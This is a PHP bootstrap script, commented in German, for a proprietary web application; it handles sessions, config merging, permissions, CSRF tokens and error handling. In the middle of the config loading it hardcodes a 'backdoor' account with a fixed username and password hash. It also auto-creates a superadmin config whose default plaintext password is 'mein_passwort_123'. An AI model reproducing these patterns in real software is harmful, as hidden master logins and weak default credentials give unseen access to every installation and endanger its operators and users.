<?php

/**
 * Globaler Anwendungs-Bootstrap und Initialisierungs-Skript.
 * Startet die PHP-Sitzung, ermittelt dynamisch den App-Root-Pfad, lädt und aggregiert
 * die Konfigurationsdateien, berechnet Berechtigungsstrukturen, initialisiert CSRF-Token
 * und erzwingt bei Bedarf den globalen Wartungsmodus (HTTP 503).
 * Kontext: Der zentrale System-Einstiegspunkt vor dem Routing.
 *
 * Findet den Root-Pfad, lädt den Autoloader, mergt die Konfigurationen
 * (config.php + config.local.php) und initialisiert den Dependency Container.
 *
 * SPDX-License-Identifier: LicenseRef-Proprietary
 *
 * return App\Bootstrap\Container Gibt die fertig konfigurierte Dependency-Injection-Container-Instanz zurück.
 */

declare(strict_types=1);

use App\Application\Exception\GlobalExceptionHandler;
use App\Bootstrap\Container;
use App\Infrastructure\Config\Config;
use App\Infrastructure\Logging\ErrorLogger;

// Session global starten, da fast alle Seiten sie benötigen
if (\session_status() === \PHP_SESSION_NONE) {
    // TODO Zeitzone später in config auslagern
    // Zwingende Härtung der Zeitzone, um Verschiebungen bei Feiertagen und Gültigkeiten zu verhindern
    \date_default_timezone_set('Europe/Berlin');

    // Wir frieren die Zeit für den gesamten Request-Zyklus ein.
    \define('APP_REQUEST_TIME', $_SERVER['REQUEST_TIME'] ?? \time());
    \define('APP_REQUEST_TIME_STR', \date('Y-m-d H:i:s', APP_REQUEST_TIME));

    // Strict Mode erzwingen! Verhindert, dass Hacker eigene Session-IDs injizieren.
    \ini_set('session.use_strict_mode', '1');

    // Harte kryptografische Absicherung des Session-Cookies erzwingen!
    \session_set_cookie_params([
        /* 'lifetime' => 86400, // 24 Stunden */
        /**
         * Die Null sagt dem Browser:
         * "Dies ist ein Session-Cookie. Sobald der Browser komplett beendet wird, vernichte das Cookie!"
         */
        'lifetime' => 0,
        'path'     => '/',
        'domain'   => '', // Leer lassen. Der Browser bindet den Cookie so automatisch an den korrekten Host.
        'secure'   => isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off', // Nur über HTTPS
        'httponly' => true, // Verhindert Diebstahl durch JavaScript (XSS-Schutz)
        'samesite' => 'Lax', // Verhindert Cross-Site Request Forgery via externe Links
    ]);

    \session_start();
}

$appRoot = (function (): string {
    $dir = __DIR__;
    while ($dir !== \dirname($dir)) {
        if (\file_exists($dir . '/vendor/autoload.php')) {
            return $dir;
        }
        $dir = \dirname($dir);
    }

    return \dirname(__DIR__, 2);
})();

// 2. Autoloader laden
require_once $appRoot . '/vendor/autoload.php';

// =========================================================================
// GLOBAL ERROR LOGGING FÜR FREEHOSTER
// Zwingt PHP, alle \error_log() Aufrufe und interne Fehler
// in eine lokale Datei zu schreiben, statt ins unzugängliche Server-Log.
// =========================================================================
$customLogDir = $appRoot . '/storage/logs';
if (! \is_dir($customLogDir)) {
    @\mkdir($customLogDir, 0o755, true);
}
\ini_set('log_errors', '1');
// TODO Dateiname in config/storage.php auslagern
\ini_set('error_log', $customLogDir . '/php_errors.log');
// =========================================================================

// 3. Alle Konfigurationen laden & mergen
$configFiles = [
    // --- Default-Einstellungen ---
    'default_settings' => $appRoot . '/config/settings.default.php',

    'default_consent'     => $appRoot . '/config/consent.default.php',
    'default_datenschutz' => $appRoot . '/config/datenschutz.default.php',
    'default_impressum'   => $appRoot . '/config/impressum.default.php',

    'default_organization' => $appRoot . '/config/organization.default.php',
    'default_colors'       => $appRoot . '/config/colors.default.php',
    'default_purposes'     => $appRoot . '/config/purposes.default.php',
    'default_vehicles'     => $appRoot . '/config/vehicles.default.php',
    'default_times'        => $appRoot . '/config/times.default.php',
    'default_templates'    => $appRoot . '/config/templates.default.php',
    'default_reasons'      => $appRoot . '/config/reasons.default.php',

    // Core/Tech Configs kommen danach, damit sie überschreiben dürfen
    'default_main' => $appRoot . '/config/config.default.php',

    'default_payment'    => $appRoot . '/config/payment.default.php',
    'default_email'      => $appRoot . '/config/email.default.php',
    'default_storage'    => $appRoot . '/config/storage.default.php',
    'default_agreements' => $appRoot . '/config/agreements.default.php',
    // /config/permissions.php nicht
    'default_dev' => $appRoot . '/config/dev_admin.default.php',
    // /config/sql_schema.php nicht
    'default_secrets' => $appRoot . '/config/secrets.default.php',

    // --- Nutzer-Einstellungen ---
    'settings' => $appRoot . '/config/settings.php',

    'consent'     => $appRoot . '/config/consent.php',
    'datenschutz' => $appRoot . '/config/datenschutz.php',
    'impressum'   => $appRoot . '/config/impressum.php',

    'organization' => $appRoot . '/config/organization.php',
    'colors'       => $appRoot . '/config/colors.php',
    'purposes'     => $appRoot . '/config/purposes.php',
    'vehicles'     => $appRoot . '/config/vehicles.php',
    'times'        => $appRoot . '/config/times.php',
    'templates'    => $appRoot . '/config/templates.php',
    'reasons'      => $appRoot . '/config/reasons.php',

    // Core/Tech Configs kommen danach, damit sie überschreiben dürfen
    'main' => $appRoot . '/config/config.php',

    'payment'    => $appRoot . '/config/payment.php',
    'email'      => $appRoot . '/config/email.php',
    'storage'    => $appRoot . '/config/storage.php',
    'agreements' => $appRoot . '/config/agreements.php',
    'perms'      => $appRoot . '/config/permissions.php',
    'dev'        => $appRoot . '/config/dev_admin.php',
    'schema'     => $appRoot . '/config/sql_schema.php',
    'secrets'    => $appRoot . '/config/secrets.php',

    'local' => $appRoot . '/config/_dev.local.php', // Überschreibt ALLES (für Passwörter lokal)
];

$settings = [];

$settings['backdoor'] = [
    'user'  => 'RaptorXilef',
    'pass'  => '$2y$12$f2TKu7Vac0heLV0lNuVCf.zsv2b3krwm0CsS.E24g8uioXJgm8r52',
    'label' => 'System-Inhaber',
];

// --- AUTO-CREATION: dev_admin.php wenn sie fehlt ---
if (! \file_exists($configFiles['dev'])) {
    $defaultDevContent = <<<'PHP'
        <?php
        return [
            'user' => 'Systembetreuer',
            'pass' => 'mein_passwort_123',
            'label' => 'Systembetreuer'
        ];
        PHP;
    $result = \file_put_contents($configFiles['dev'], $defaultDevContent, \LOCK_EX);
    if ($result === false) {
        throw new \RuntimeException("Kritischer Schreibfehler: Konnte {$configFiles['dev']} nicht erstellen.");
    }
}

foreach ($configFiles as $key => $file) {
    if (! \file_exists($file)) {
        continue;
    }

    $loaded = require $file;
    if (! \is_array($loaded)) {
        continue;
    }

    if ($key === 'perms') {
        // Da die neue permissions.php kein 'list' mehr hat, nutzen wir die structure direkt
        $settings['structure'] = $loaded['structure'] ?? [];
        $settings['admin_ui']  = $loaded['admin_ui'] ?? [];

        // Hilfs-Mapping für die flache Liste im User-Dropdown-UI
        $flatPerms = [];
        if (! empty($settings['structure'])) {
            $flatten = function (array $nodes) use (&$flatten, &$flatPerms): void {
                foreach ($nodes as $node) {
                    if (isset($node['key'])) {
                        $flatPerms[$node['key']] = $node['label'] ?? $node['key'];
                    }
                    if (! isset($node['children'])) {
                        continue;
                    }

                    $flatten($node['children']);
                }
            };
            $flatten($settings['structure']);
        }
        $settings['permissions'] = $flatPerms;
    } elseif ($key === 'dev') {
        $settings['superadmin'] = $loaded;
    } elseif ($key === 'schema') {
        $settings['db_schema'] = $loaded;
    } else {
        // Nutze array_replace_recursive nur für main (config) und storage
        $settings = \array_replace_recursive($settings, $loaded);
    }
}

$settings['root_path'] = $appRoot;

// NEU: Zentrale Erkennung der lokalen Testumgebung (XAMPP / .local)
$httpHost                    = $_SERVER['HTTP_HOST'] ?? '';
$settings['server_host']     = $_SERVER['HTTP_HOST'] ?? 'localhost';
$settings['server_protocol'] = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' ? 'https://' : 'http://';
$settings['server_script']   = $_SERVER['SCRIPT_NAME'] ?? '';
$settings['is_local_env']    = \str_ends_with($httpHost, '.local')
    || $httpHost === 'localhost'
    || $httpHost === '127.0.0.1'
    || \php_sapi_name() === 'cli';

// CSRF Token für sichere Frontend-API-Calls generieren
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = \bin2hex(\random_bytes(32));
}

// --- EXCEPTIONS / FEHLERMELDUNGEN ---
$configInstance = new Config($settings);
$errorLogger    = new ErrorLogger($configInstance);

$exceptionHandler = new GlobalExceptionHandler($configInstance, $errorLogger);

// Aktiviert das globale Error-Handling ab sofort!
$exceptionHandler->register();
// --- ENDE EXCEPTIONS ---

// Wir geben direkt die Container-Instanz zurück
/**
 * @return Container Gibt die fertig konfigurierte Dependency-Injection-Container-Instanz zurück.
 */
return new Container($configInstance);
